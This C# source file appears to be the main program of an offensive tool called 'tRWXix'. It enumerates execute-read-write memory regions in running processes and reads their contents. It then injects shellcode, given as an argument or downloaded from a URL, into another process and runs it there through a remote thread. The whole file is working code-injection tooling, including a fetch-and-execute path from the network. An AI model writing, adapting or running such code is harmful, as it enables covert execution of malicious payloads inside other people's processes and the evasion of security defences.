using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using NtApiDotNet;

namespace tRWXix
{
    public class Program
    {
        public static void Main(string[] args)
        {
            Dictionary<string, string> parameters = Utils.ArgParser.parse(args);

            if (parameters.ContainsKey("enumerate"))
            {
                foreach (NtProcess proc in NtProcess.GetProcesses(ProcessAccessRights.AllAccess))
                {
                    IEnumerable<MemoryInformation> mem = NtVirtualMemory.QueryMemoryInformation(proc.Handle);
                    foreach (MemoryInformation m in mem)
                    {
                        if (m.Protect.Equals(MemoryAllocationProtect.ExecuteReadWrite) && m.State == MemoryState.Commit && m.Type == MemoryType.Private)
                        {
                            Console.WriteLine(String.Format("[+] {0}:{1}\taddress:0x{2:X}\tsize:{3}", proc.ProcessId, proc.Name, m.BaseAddress, m.RegionSize));
                        }
                    }
                }
            }
            else if (parameters.ContainsKey("trigger") || parameters.ContainsKey("inject") || parameters.ContainsKey("read"))
            {
                if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
                {
                    int pid = Convert.ToInt32(parameters["pid"]);
                    NtProcess proc = NtProcess.Open(pid, ProcessAccessRights.AllAccess);
                    long addr = (long)Convert.ToInt64(parameters["address"], 16);
                    if (parameters.ContainsKey("read"))
                    {
                        int size = Convert.ToInt32(parameters["size"]);
                        Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(NtVirtualMemory.ReadMemory(proc.Handle, addr, size))));
                        Environment.Exit(0);
                    }
                    if (parameters.ContainsKey("inject"))
                    {
                        byte[] data;
                        if (parameters.ContainsKey("data"))
                        {
                            data = Utils.Shellcoder.convert(parameters["data"]);
                        }
                        else if (parameters.ContainsKey("url"))
                        {
                            data = Utils.Shellcoder.fetch(parameters["url"]);
                        }
                        else
                        {
                            Console.WriteLine("[-] No data to inject...");
                            data = new byte[] { };
                        }
                        Console.WriteLine("[!] Writing to the provided RWX memory region");
                        int numberOfBytesWritten = NtVirtualMemory.WriteMemory(proc.Handle, addr, data);
                        Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
                    }

                    Console.WriteLine("[!] Executing code");
                    if (NtThread.Create(proc, addr, 0, ThreadCreateFlags.None, 4096).ExitNtStatus == NtStatus.STATUS_PENDING) 
                    {
                        Console.WriteLine(String.Format("[!] Successfully executed code."));
                        Environment.Exit(0);
                    }
                }
                else
                {
                    Utils.Helper.help();
                    Environment.Exit(-1);
                }
            }
            else
            {
                Utils.Helper.help();
                Environment.Exit(-1);
            } 
        }
    }
}
